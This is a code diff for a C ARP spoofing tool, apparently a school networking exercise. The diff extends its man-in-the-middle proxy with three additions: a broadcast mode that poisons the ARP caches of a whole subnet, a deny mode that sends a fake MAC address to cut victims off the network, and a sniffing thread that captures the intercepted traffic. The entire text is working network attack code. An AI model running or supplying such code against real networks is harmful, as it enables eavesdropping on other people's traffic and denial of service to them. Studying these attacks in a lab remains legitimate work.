@@ -83,7 +83,10 @@ static int spoof(uint8_t *tip, uint8_t *tmac, uint8_t *sip, uint8_t *smac,
 		printf("[*] Sent %d byte(s) to ", ret);
 		print_mac(packet.arp.tha);
 		fflush(stdout);
-		printf("\n");
+		printf(" (");
+		print_mac(packet.arp.sha);
+		fflush(stdout);
+		printf(")\n");
 		fflush(stdout);
 	}
 
@@ -172,8 +175,11 @@ int ft_proxy(uint8_t *source_ip, uint8_t *target_ip)
 	int if_idx;
 	uint8_t if_mac[ETH_ADDR_LEN] = {0};
 	uint8_t if_ip[IP_ADDR_LEN] = {0};
+	uint8_t if_brdcst[IP_ADDR_LEN] = {0};
 	struct timespec wait = {g_data.frequency, 0};
 	uint64_t i = 0;
+	int tret;
+	pthread_t thread;
 
 	ft_bzero(&sockaddr, sizeof(struct sockaddr_ll));
 
@@ -187,12 +193,28 @@ int ft_proxy(uint8_t *source_ip, uint8_t *target_ip)
 	if (interface_ip(g_data.interface, if_ip) < 0)
 		return 1;
 
+	ft_memcpy(g_data.if_mac, if_mac, ETH_ADDR_LEN);
+	ft_memcpy(g_data.if_ip, if_ip, IP_ADDR_LEN);
+
+	if (g_data.opt & OPT_BROADCAST) {
+		uint8_t brdcst[ETH_ADDR_LEN] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
+		if (interface_brdcst(g_data.interface, if_brdcst) < 0)
+			return 1;
+		ft_memcpy(g_data.target_ip, if_brdcst, IP_ADDR_LEN);
+		ft_memcpy(g_data.target_mac, brdcst, ETH_ADDR_LEN);
+	}
+
 	if (g_data.opt & OPT_VERBOSE) {
 		printf("[*] %s has index %d with MAC address ", g_data.interface, if_idx);
 		print_mac(if_mac);
-		printf(" and IP address ");
+		printf(", IP address ");
 		fflush(stdout);
 		print_ip(STDOUT_FILENO, if_ip);
+		if (g_data.opt & OPT_BROADCAST) {
+			printf(" and broadcast address ");
+			fflush(stdout);
+			print_ip(STDOUT_FILENO, if_brdcst);
+		}
 		printf("\n");
 	}
 
@@ -204,11 +226,20 @@ int ft_proxy(uint8_t *source_ip, uint8_t *target_ip)
 	sockaddr.sll_pkttype = ARPHRD_NETROM;
 
 	/* Getting MAC addresses with ARP requests */
-	if (arp_request(source_ip, sockaddr, if_mac, if_ip, g_data.source_mac) ||
-		arp_request(target_ip, sockaddr, if_mac, if_ip, g_data.target_mac))
-		return 1;
+	if (g_data.opt & OPT_BROADCAST) {
+		if (arp_request(source_ip, sockaddr, if_mac, if_ip, g_data.source_mac))
+			return 1;
+	}
+	else {
+		if (arp_request(source_ip, sockaddr, if_mac, if_ip, g_data.source_mac) ||
+			arp_request(target_ip, sockaddr, if_mac, if_ip, g_data.target_mac))
+			return 1;
+	}
 
-	dprintf(STDOUT_FILENO, "Proxying between ");
+	if (g_data.opt & OPT_DENY)
+		dprintf(STDOUT_FILENO, "Denying between ");
+	else
+		dprintf(STDOUT_FILENO, "Proxying between ");
 	print_ip(STDOUT_FILENO, g_data.source_ip);
 	dprintf(STDOUT_FILENO, " and ");
 	print_ip(STDOUT_FILENO, g_data.target_ip);
@@ -221,33 +252,63 @@ int ft_proxy(uint8_t *source_ip, uint8_t *target_ip)
 	if (g_data.opt & OPT_VERBOSE)
 		printf("[*] Starting the spoof process\n");
 
+	if (g_data.opt & OPT_DENY) {
+		uint8_t deny[ETH_ADDR_LEN] = {0xde, 0xad, 0x00, 0x00, 0xde, 0xad};
+		ft_memcpy(if_mac, deny, ETH_ADDR_LEN);
+	}
+
+	/* LISTEN THREAD INIT */
+	if (g_data.opt & OPT_SNIFF)
+		tret = launch_thread(&thread);
+
 	while (g_data.loop) {
-		if ((spoof(target_ip, g_data.target_mac, source_ip, if_mac,
-			sockaddr)) != 0 ||
-			(spoof(source_ip, g_data.source_mac, target_ip, if_mac,
-			sockaddr) != 0))
-		{
-			break;
+		if (g_data.opt & OPT_BROADCAST) {
+			if ((spoof(target_ip, g_data.target_mac, source_ip, if_mac,
+				sockaddr) != 0))
+			{
+				break;
+			}
+		}
+		else {
+			if ((spoof(target_ip, g_data.target_mac, source_ip, if_mac,
+				sockaddr)) != 0 ||
+				(spoof(source_ip, g_data.source_mac, target_ip, if_mac,
+				sockaddr) != 0))
+			{
+				break;
+			}
 		}
 
-		/* Display related */
-		ft_putchar('\r');
-		printf("Spoofing ");
-		fflush(stdout);
-		ft_putchar(g_data.wait_loop[i % g_data.wait_loop_len]);
-		i++;
+		if (!(g_data.opt & OPT_SNIFF)) {
+			/* Display related */
+			ft_putchar('\r');
+			printf("Spoofing ");
+			fflush(stdout);
+			ft_putchar(g_data.wait_loop[i % g_data.wait_loop_len]);
+			i++;
+		}
 
-		if (g_data.opt & OPT_VERBOSE)
-			printf("\n[*] Waiting %d seconds\n", g_data.frequency);
+		if (g_data.opt & OPT_VERBOSE) {
+			if (!(g_data.opt & OPT_SNIFF))
+				printf("\n");
+			printf("[*] Waiting %d seconds\n", g_data.frequency);
+		}
 		clock_nanosleep(CLOCK_REALTIME, 0, &wait, NULL);
 	}
+
+	/* CLOSE LISTEN THREAD */
+	int *retval;
+	if (g_data.opt & OPT_SNIFF && !tret &&
+		pthread_join(thread, (void**)&retval) != 0)
+		fprintf(stderr, "[!] Failed to close thread\n");
 
 	/* Restore ARP cache for targets */
 	printf("Restoring ARP cache for targets\n");
 	i = 4;
 	while (i > 0) {
 		spoof(target_ip, g_data.target_mac, source_ip, g_data.source_mac, sockaddr);
-		spoof(source_ip, g_data.source_mac, target_ip, g_data.target_mac, sockaddr);
+		if (!(g_data.opt & OPT_BROADCAST))
+			spoof(source_ip, g_data.source_mac, target_ip, g_data.target_mac, sockaddr);
 		i--;
 	}
 
